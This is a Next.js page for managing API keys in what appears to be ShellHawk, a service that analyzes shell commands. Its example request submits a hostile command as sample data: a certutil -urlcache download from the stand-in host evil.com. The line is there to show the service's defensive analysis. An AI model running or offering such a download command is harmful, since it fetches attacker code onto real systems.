import type { Metadata } from "next";
import { auth } from "@/auth";
import { redirect } from "next/navigation";
import ApiKeysClient from "./ApiKeysClient";
import { backendUrl } from "@/app/lib/api";

export const metadata: Metadata = { title: "API keys — ShellHawk" };

async function getKeys(email: string) {
  try {
    const res = await fetch(`${backendUrl()}/api-keys?email=${encodeURIComponent(email)}`, { cache: "no-store" });
    if (!res.ok) return [];
    return res.json();
  } catch {
    return [];
  }
}

export default async function ApiKeysPage() {
  const session = await auth();
  if (!session?.user) redirect("/login?next=/account/api-keys");

  const keys = await getKeys(session.user.email!);

  return (
    <div className="max-w-3xl mx-auto w-full px-4 py-10 flex flex-col gap-8">
      <div>
        <h1 className="text-2xl font-bold">API keys</h1>
        <p className="text-[var(--muted)] text-sm mt-1">
          Use API keys to submit analyses programmatically. Pass your key as{" "}
          <code className="font-mono text-xs bg-[var(--border)] px-1 py-0.5 rounded">X-API-Key: cckey_…</code> on requests to{" "}
          <code className="font-mono text-xs bg-[var(--border)] px-1 py-0.5 rounded">POST /analyze</code>.
        </p>
      </div>

      <ApiKeysClient initialKeys={keys} />

      <div className="border border-[var(--border)] rounded-lg px-4 py-4 bg-[var(--surface)] flex flex-col gap-2">
        <p className="text-xs font-semibold text-[var(--muted)] uppercase tracking-wide">Example request</p>
        <pre className="font-mono text-xs text-[var(--foreground)] whitespace-pre-wrap">{`curl -X POST https://api.shellhawk.net/analyze \\
  -H "X-API-Key: cckey_…" \\
  -H "Content-Type: application/json" \\
  -d '{"command": "certutil -urlcache -split -f http://evil.com/p"}'`}</pre>
      </div>
    </div>
  );
}
